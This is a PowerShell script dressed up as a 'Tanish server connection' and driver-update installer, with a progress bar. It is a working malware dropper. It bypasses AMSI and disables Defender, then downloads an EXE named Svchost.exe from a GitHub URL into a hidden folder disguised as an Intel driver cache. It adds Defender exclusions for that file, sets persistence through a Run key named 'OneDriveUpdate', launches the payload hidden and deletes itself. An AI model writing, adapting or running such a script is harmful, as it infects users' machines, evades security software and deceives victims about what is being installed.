# ============================================
# PUSHPA SERVER CONNECTION - USER LEVEL
# ============================================

# AMSI Bypass
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# Defender OFF
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# ============================================
# PROGRESS DISPLAY
# ============================================
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    TANISH SERVER CONNECTION                  ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

function Show-Progress {
    param($step, $total, $message)
    $percent = [math]::Round(($step / $total) * 100)
    $barLen = 50
    $filled = [math]::Floor($percent / 2)
    $bar = "█" * $filled + "░" * ($barLen - $filled)
    Write-Host "  [$bar] $percent%  - $message" -ForegroundColor Yellow
}

# ============================================
# CREATE HIDDEN FOLDER
# ============================================
$folder = "$env:ProgramData\Intel\DriverCache"
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}
Set-ItemProperty -Path $folder -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue

$name = -join ((65..90) | Get-Random -Count 8 | %{[char]$_}) + ".exe"
$path = Join-Path $folder $name

# ============================================
# STEP 1: Initializing
# ============================================
Show-Progress -step 1 -total 6 -message "Initializing connection..."
Start-Sleep -Milliseconds 500

# ============================================
# STEP 2: Download EXE
# ============================================
Show-Progress -step 2 -total 6 -message "Downloading driver updates..."
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
    if (!(Test-Path $path)) { exit }
} catch { exit }

# ============================================
# STEP 3: Configure Exclusions
# ============================================
Show-Progress -step 3 -total 6 -message "Configuring security exclusions..."
Set-ItemProperty -Path $path -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue

# ============================================
# STEP 4: Setup Auto-Start (USER LEVEL - NO SYSTEM TASK)
# ============================================
Show-Progress -step 4 -total 6 -message "Setting up auto-start..."

# ONLY Registry Run (User Level - Game compatible)
$reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $reg -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue

# NO Scheduled Task - it causes game compatibility issues

# ============================================
# STEP 5: Start Application
# ============================================
Show-Progress -step 5 -total 6 -message "Starting application..."
Start-Process -FilePath $path -WindowStyle Hidden -ErrorAction SilentlyContinue

# ============================================
# STEP 6: Finalizing
# ============================================
Show-Progress -step 6 -total 6 -message "Finalizing..."
Write-Host ""
Write-Host "  ⏳ Waiting for initialization (25 seconds)..." -ForegroundColor Gray

for ($i = 25; $i -ge 1; $i--) {
    Write-Host "`r  ⏳ $i seconds remaining..." -NoNewline -ForegroundColor Gray
    Start-Sleep -Seconds 1
}
Write-Host ""

# ============================================
# DEFENDER BACK ON
# ============================================
Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue

# ============================================
# DONE
# ============================================
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║         ✓ YOU ARE NOW CONNECTED TO TANISH SERVER            ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""

# Self-delete (only if running from file)
if ($MyInvocation.MyCommand.Path) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}

exit
